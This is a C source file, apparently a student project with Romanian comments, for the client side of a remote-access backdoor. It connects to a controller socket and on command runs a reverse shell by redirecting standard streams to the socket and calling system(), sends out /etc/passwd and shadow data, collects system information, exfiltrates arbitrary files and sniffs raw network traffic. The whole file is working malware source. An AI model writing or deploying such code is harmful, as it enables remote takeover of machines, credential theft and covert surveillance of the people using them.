#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "traffic_monitor.h"
#include "credentials_utils.h"
#include "system_info_utils.h"
#define PORT	 8080

int sockfd;


//TODO avem voie sa folosim system sau e prea usor?
void exec_commmand()
{
    char recv_command[MAXLINE];
    int command_len;
    command_len=read(sockfd,recv_command,MAXLINE);

    if(command_len<=0) return;

	dup2(sockfd,0);
	dup2(sockfd,1);
	dup2(sockfd,2);

	system(recv_command);
    
}	

void send_file()
{	
	myWrite("Receiving filename",1);
	struct file_struct file_to_send;

	read(sockfd,&file_to_send,sizeof(file_to_send));
	//add verificare ca exista fisierul
	printf("Name length: %d\n",file_to_send.name_length);
    printf("Name:%s",file_to_send.file_name);
    printf("Bytes received: %d\n",file_to_send.file_size);

	file_to_send.file_name[file_to_send.name_length]=0;

	char fname[100];
	strncpy(fname,file_to_send.file_name,file_to_send.name_length);

	fname[file_to_send.name_length]=NULL;

	int len=strlen(fname);

	int fd=open(fname,O_RDONLY);

	char buffer[100];
	file_to_send.file_size=read(fd,buffer,100);
	
	strncpy(file_to_send.file_bytes,buffer,file_to_send.file_size);

	write(sockfd,&file_to_send,sizeof(file_to_send));

}

void capturetraffic()
{	


	if(getuid()==1000)
	{
		myWrite("No root on client, cannot capture traffic.",sockfd);
		send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"),0);
		return;
	}

	int fd_log=open("traffic_log.txt",O_CREAT|O_RDWR);

	int saddr_size,data_size;
	struct sockaddr saddr;
	struct in_addr in;

	char buffer[MAXLINE*20];

	int sock_raw=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	int nr_packets=0;
	while(nr_packets<=1000)
	{
	
	saddr_size=sizeof(saddr);
	data_size=recvfrom(sock_raw,buffer,MAXLINE*20,0,&saddr,&saddr_size);
	if(data_size<0)
	{
		myWrite("Error handling packets",STDOUT_FILENO);
	}
	else processPackets(buffer,data_size,sockfd);
	nr_packets++;
	}
	send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"),0);

	//TODO: socket error handling

	
}

int main() {
	char buffer[MAXLINE];
	struct sockaddr_in	 servaddr;
	
	
	if ( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
 
	memset(&servaddr, 0, sizeof(servaddr));
 
	
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(PORT);
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
	int n, len;

	int val_conn;
    val_conn=connect(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr));
	if(val_conn!=0)
	{
		perror("connection failed");
		exit(EXIT_FAILURE);
	}
    while(1)
	{	
		myWrite("Receiving option",STDOUT_FILENO);
		char opt;
		int bytesRead=0;
		while(bytesRead!=1)
		{
			bytesRead=read(sockfd,&opt,1);
		}
		myWrite("Received option",STDOUT_FILENO);
		switch(opt)
		{	

			//TODO: Flush la buffer atunci cand vreau sa execut o comanda
			case '1':
			exec_commmand();
			break;
			case '2':
			etc_passwd_shadow_checker(sockfd);
			break;
			case '3':
    		collect_system_info(sockfd);
    		break;
			case '4':
			send_file();
			case '5':
			capturetraffic();
			break;
			default:
			break;
		}
	}


	close(sockfd);
	return 0;
}